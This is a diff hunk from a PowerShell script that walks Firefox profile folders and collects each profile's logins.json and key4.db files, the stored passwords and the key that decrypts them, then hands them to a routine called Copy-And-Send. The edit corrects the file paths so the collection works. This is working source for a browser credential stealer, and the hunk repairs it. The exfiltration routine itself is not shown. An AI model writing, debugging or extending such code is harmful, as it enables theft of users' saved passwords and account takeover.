@@ -84,8 +84,8 @@ if (Test-Path $firefoxProfileDir) {
     $profiles = Get-ChildItem -Path $firefoxProfileDir -Directory
     foreach ($profile in $profiles) {
         $profileName = $profile.Name
-        $dbPath = "$profile.FullName\logins.json"
-        $masterKeyPath = "$profile.FullName\key4.db"
+        $dbPath = "$profile\logins.json"
+        $masterKeyPath = "$profile\key4.db"
         Copy-And-Send -browserName "Firefox" -dbPath $dbPath -masterKeyPath $masterKeyPath -profileName $profileName
     }
 } else {
